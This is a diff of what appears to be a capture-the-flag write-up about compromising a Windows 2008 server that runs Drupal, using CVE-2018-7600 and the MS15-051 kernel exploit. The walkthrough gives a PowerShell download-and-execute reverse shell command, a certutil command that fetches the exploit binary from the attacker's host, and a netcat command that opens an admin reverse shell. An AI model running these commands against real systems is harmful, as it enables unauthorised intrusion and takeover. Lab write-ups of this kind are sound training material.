@@ -54,26 +54,26 @@ PORT      STATE SERVICE VERSION
 <span class="hljs-number">49154</span>/tcp open  msrpc   Microsoft Windows RPC
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre></div>
 <p>Drupal CMS welcomes us on port 80.</p>
-<p><img src="/_resources/2728ae9445bd4bef97783cd9fa12b116.png" /></p>
+<p><img src=":/2728ae9445bd4bef97783cd9fa12b116" alt="3d5f7529402198853e56f4f775c09bf0.png" /></p>
 <p>We can grab it’s version by going to <code>/CHANGELOG.TXT</code>.</p>
-<p><img src="/_resources/777e8836676246ea88c0126bb1c28f46.png" /></p>
+<p><img src=":/777e8836676246ea88c0126bb1c28f46" alt="c3571578857a3e5954a63c20472279d8.png" /></p>
 <p>Checing it with NIST, we can see that it has <a title="https://nvd.nist.gov/vuln/detail/CVE-2018-7600" href="https://nvd.nist.gov/vuln/detail/CVE-2018-7600">juicy 9.8 Critical CVE</a>.</p>
-<p><img src="/_resources/6c744aa5969f402683f84e7f2110962d.png" /></p>
+<p><img src=":/6c744aa5969f402683f84e7f2110962d" alt="e9e431a9661cbee079d5f7ddbd5887e9.png" /></p>
 <p>We can find then <a title="https://github.com/pimps/CVE-2018-7600" href="https://github.com/pimps/CVE-2018-7600">PoC of the exploit on github.</a></p>
-<p><img src="/_resources/98017308a1c24c79acfa33f36f9cadc2.png" /></p>
-<p><img src="/_resources/b7ac5cc13f5c4793bdd28860787cf238.png" /></p>
+<p><img src=":/98017308a1c24c79acfa33f36f9cadc2" alt="74aa9cc374af3a3be0a91107b7b786d6.png" /></p>
+<p><img src=":/b7ac5cc13f5c4793bdd28860787cf238" alt="e675c7015f75d4aa0a53c824b58a89b8.png" /></p>
 <p>We can get reverse shell using Invoke-PowerShellTcp.ps1</p>
 <div><pre class="hljs"><code>powershell iex (<span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> Net.WebClient).DownloadString(<span class="hljs-string">'http://10.10.66.152:8000/Invoke-PowerShellTcp.ps1'</span>);Invoke-PowerShellTcp -<span class="hljs-keyword">Reverse</span> -IPAddress <span class="hljs-number">10.10</span><span class="hljs-number">.66</span><span class="hljs-number">.152</span> -Port <span class="hljs-number">4242</span></code></pre></div>
-<p><img src="/_resources/fbaf9666d9fe4ad4a53eba05f7d5b1db.png" /></p>
-<p><img src="/_resources/34c01dceed87411aa6d3876477eafb39.png" /></p>
-<p><img src="/_resources/8d73b9be39714f45ac9de319f6592020.png" /></p>
+<p><img src=":/fbaf9666d9fe4ad4a53eba05f7d5b1db" alt="924f522fb4c4385b00fe52098b59f630.png" /></p>
+<p><img src=":/34c01dceed87411aa6d3876477eafb39" alt="e801800378de583556274a1d6dc36057.png" /></p>
+<p><img src=":/8d73b9be39714f45ac9de319f6592020" alt="0eb4e1b8c1af1d85e5f5853e2da217f3.png" /></p>
 <h1 id="privilage-escalation">Privilage escalation</h1>
-<p><img src="/_resources/0ccae38684fc4a1487015d8815e34d36.png" /></p>
+<p><img src=":/0ccae38684fc4a1487015d8815e34d36" alt="abb9d487de51a8f94375d9a7ead4bb70.png" /></p>
 <p>It’s vanilla windows 2008 server, so we can run exec exploiting <a title="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051" href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051">MS15-051</a>.</p>
 <p>We can send it over using http-server again, and get it using <code>certutil.exe -urlcache -split -f http://10.10.16.21/ms15-051x64.exe ms15-051x64.exe</code>.</p>
-<p><img src="/_resources/2142ccb2733143fbb1507a78e59ce363.png" /></p>
+<p><img src=":/2142ccb2733143fbb1507a78e59ce363" alt="d551930ee89afaf91fc53ab748e549b5.png" /></p>
 <p>It works, so we can get reverse shell with admin, by sending over nc and running ".\ms15-051x64.exe “nc.exe -e cmd.exe 10.10.16.21 5555”</p>
-<p><img src="/_resources/f3d6bbc11dd14c42b02c8945492e788d.png" /></p>
+<p><img src=":/f3d6bbc11dd14c42b02c8945492e788d" alt="0141948cab45be26420ece76b85e8f4d.png" /></p>
 </div>
       </article>
     </div>
